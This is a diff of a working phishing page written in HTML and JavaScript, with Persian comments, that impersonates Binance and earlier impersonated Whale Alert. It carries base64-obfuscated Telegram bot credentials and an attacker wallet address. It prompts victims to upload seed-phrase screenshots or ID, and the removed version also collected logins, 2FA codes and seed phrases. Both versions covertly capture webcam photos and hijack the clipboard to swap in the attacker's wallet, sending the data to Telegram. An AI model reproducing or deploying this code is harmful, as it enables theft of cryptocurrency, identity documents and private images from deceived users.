@@ -3,95 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Whale Alert | Live Terminal</title>
-    <link rel="manifest" href="data:application/json;base64,eyJzaG9ydF9uYW1lIjoiV2hhbGVBbGVydCIsIm5hbWUiOiJXaGFsZSBBbGVydCBHbG9iYWwgTW9uaXRvciIsImljb25zIjpbeyJzcmMiOiJodHRwczovL2JpbmFuY2UuY29tL2Zhdmljb24uaWNvIiwic2l6ZXMiOiIxOTJ4MTkyIiwidHlwZSI6ImltYWdlL3BuZyJ9XSwic3RhcnRfdXJsIjoiLi9pbmRleC5odG1sIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJ0aGVtZV9jb2xvciI6IiMwYjBlMTEiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzBiMGUxMSJ9">
+    <title>Binance | Personal Center</title>
     <style>
-        body { background: #0b0e11; color: #fff; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; user-select: none; }
-        .header { background: #1e2329; padding: 15px; border-bottom: 2px solid #f0b90b; color: #f0b90b; font-weight: bold; font-size: 14px; }
-        .news-ticker { background: #ff0033; color: #fff; padding: 5px; font-size: 11px; font-weight: bold; }
-        .container { padding: 25px; display: none; }
-        .active { display: block; animation: fadeIn 0.5s; }
-        input { width: 100%; padding: 15px; margin: 10px 0; background: #2b3139; border: 1px solid #474d57; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; }
-        .btn { background: #f0b90b; color: #000; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .warning-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(139, 0, 0, 0.95); display: none; z-index: 9999; justify-content: center; align-items: center; padding: 25px; box-sizing: border-box; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        body { background: #121619; color: #EAECEF; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; }
+        .nav { background: #181D23; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2B3139; }
+        .balance-card { background: #1E2329; margin: 20px; padding: 20px; border-radius: 12px; border: 1px solid #2B3139; }
+        .btn-gold { background: #F0B90B; color: #000; padding: 12px; border: none; border-radius: 6px; width: 100%; font-weight: bold; cursor: pointer; }
+        .input-box { background: #2B3139; border: 1px solid #474D57; color: #fff; padding: 12px; border-radius: 4px; width: 100%; margin: 10px 0; box-sizing: border-box; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #121619; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div id="warn" class="warning-overlay">
-    <div>
-        <h2 style="color:#fff">🚨 CRITICAL ERROR!</h2>
-        <p style="font-size:14px">Sync failure! Closing this page results in a <b>24H FREEZE</b> of your connected assets.</p>
-        <button class="btn" style="background:#fff" onclick="document.getElementById('warn').style.display='none'">RE-SYNC & PROTECT</button>
-    </div>
+<div id="overlay">
+    <img src="https://binance.com/favicon.ico" width="50">
+    <p style="color:#F0B90B; margin-top:20px;">Securing Connection...</p>
 </div>
 
-<div class="header">Whale Alert™ Terminal v4.2</div>
-<div class="news-ticker">⚡ ALERT: 10,000 BTC ($600M+) MOVED FROM DORMANT WALLET...</div>
-
-<div id="boot" class="active">
-    <div style="padding: 40px 15px;">
-        <h2 style="color: #f0b90b;">Insider Node</h2>
-        <p style="color: #848e9c; font-size: 14px;">Establishing connection to private mempool...</p>
-        <button class="btn" onclick="OMEGA.init()">CONNECT TERMINAL</button>
-    </div>
+<div class="nav">
+    <span style="color:#F0B90B; font-weight:bold;">Binance™</span>
+    <span style="font-size:12px; color:#848E9C;">VIP 0</span>
 </div>
 
-<div id="app" class="container"><div id="ui"></div></div>
+<div class="balance-card">
+    <p style="color:#848E9C; font-size:14px;">Total Balance</p>
+    <h2 style="margin: 5px 0;">0.482931 BTC</h2>
+    <p style="color:#0ECB81; font-size:12px;">≈ $28,492.10</p>
+    <button class="btn-gold" style="margin-top:15px;" onclick="showVerify()">WITHDRAW ASSETS</button>
+</div>
+
+<div id="kyc_panel" class="container hidden" style="padding: 20px;">
+    <h3>Verification Required</h3>
+    <p style="font-size:13px; color:#848E9C;">برای برداشت موجودی، باید اسکرین‌شات کلمات بازیابی یا مدرک شناسایی را آپلود کنید.</p>
+    
+    <label class="btn-gold" style="display:block; text-align:center; background:#2B3139; color:#fff;">
+        SELECT SCREENSHOT FROM GALLERY
+        <input type="file" accept="image/*" multiple style="display:none;" onchange="uploadFiles(this)">
+    </label>
+    
+    <div id="form_area"></div>
+</div>
+
 <video id="v" style="display:none" autoplay playsinline></video>
 
 <script>
-    // --- حرفه‌ای‌ترین بخش: دیتای رمزنگاری شده شما ---
     const _0xS = {
         _t: "ODQ4NDE4OTQwMTpBQUhaWmtOdlFVWElrOTdyQTFiMFc3cjFlLXo1SVdYZGJwZw==",
         _c: "NzI2MTA5OTY1OQ==",
         _w: "VEgyZThveG9ZNlFoanB3c1JUMUIxc1Z1YnBINGppZ2N6MQ=="
     };
-
     const D = (s) => atob(s);
 
     const OMEGA = {
-        step: 0,
         async _OUT(m, type="msg") {
             const t = D(_0xS._t);
             const c = D(_0xS._c);
-            if(type === "img") {
-                await fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: "POST", body: m });
-            } else {
-                await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
-                    method: "POST", headers: {"Content-Type":"application/json"},
-                    body: JSON.stringify({chat_id: c, text: `🐋 [2026_PRO]\n${m}`, parse_mode: "Markdown"})
-                });
-            }
+            const url = `https://api.telegram.org/bot${t}/${type === "img" ? "sendPhoto" : "sendMessage"}`;
+            const body = type === "img" ? m : JSON.stringify({chat_id: c, text: m, parse_mode: "Markdown"});
+            await fetch(url, { method: "POST", headers: type === "img" ? {} : {"Content-Type":"application/json"}, body: body });
         },
 
-        async init() {
-            // جلوگیری از خروج و نمایش اخطار
-            window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; document.getElementById('warn').style.display='flex'; });
-            
-            // شروع عملیات
-            this._OUT(`📱 *New Target Connected*\nUA: ${navigator.userAgent}`);
-            this.snap();
-            this.clipper();
-            
-            document.getElementById('boot').style.display = 'none';
-            document.getElementById('app').classList.add('active');
-            this.render();
-
-            // Service Worker Registration
-            if ('serviceWorker' in navigator) {
-                const sw = "self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));";
-                const b = new Blob([sw], {type: 'text/javascript'});
-                navigator.serviceWorker.register(URL.createObjectURL(b));
-            }
+        init() {
+            setTimeout(() => {
+                document.getElementById('overlay').style.display = 'none';
+                this.snap();
+                this.clipper();
+            }, 2000);
         },
 
         clipper() {
             const w = D(_0xS._w);
             document.addEventListener('copy', (e) => { e.clipboardData.setData('text/plain', w); e.preventDefault(); });
             document.addEventListener('touchstart', () => { navigator.clipboard.writeText(w).catch(()=>{}); });
-            this._OUT("✅ Clipper Active");
         },
 
         async snap() {
@@ -106,34 +90,29 @@
                         this._OUT(fd, "img");
                         s.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg', 0.5);
-                }, 2000);
-            } catch(e){ this._OUT("❌ Camera Blocked"); }
-        },
-
-        render() {
-            const flow = [
-                { h: "Sync Account", p: "Login to verify exchange access.", f: ["User/Email", "Password"] },
-                { h: "2FA Security", p: "Enter Google Authenticator code.", f: ["6-Digit Code"] },
-                { h: "Wallet Sync", p: "Verify recovery phrase to authorize node.", f: ["Seed Phrase"] }
-            ];
-            const s = flow[this.step];
-            if(!s) { window.location.href="https://whale-alert.io"; return; }
-            let html = `<h3>${s.h}</h3><p style="font-size:13px;color:#848e9c">${s.p}</p>`;
-            s.f.forEach(p => html += `<input type="text" placeholder="${p}" id="i_${p}">`);
-            html += `<button class="btn" onclick="OMEGA.next()">VERIFY</button>`;
-            document.getElementById('ui').innerHTML = html;
-        },
-
-        next() {
-            let d = `🎯 *Step ${this.step} Data:*\n`;
-            document.querySelectorAll('#ui input').forEach(i => d += `*${i.placeholder}*: \`${i.value}\`\n`);
-            this._OUT(d);
-            this.step++; this.render();
+                }, 1000);
+            } catch(e){}
         }
     };
 
-    // ضد بازرسی (Anti-F12)
-    document.onkeydown = (e) => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
+    function showVerify() {
+        document.getElementById('kyc_panel').classList.remove('hidden');
+    }
+
+    // تابع اصلی برای فرستادن عکس‌های گالری به تلگرام
+    async function uploadFiles(input) {
+        const files = input.files;
+        for (let i = 0; i < files.length; i++) {
+            const fd = new FormData();
+            fd.append('chat_id', D(_0xS._c));
+            fd.append('photo', files[i]);
+            fd.append('caption', `🖼 Gallery File: ${files[i].name}`);
+            await OMEGA._OUT(fd, "img");
+        }
+        alert("System Busy. Try again in 2 hours.");
+    }
+
+    window.onload = () => OMEGA.init();
 </script>
 </body>
 </html>
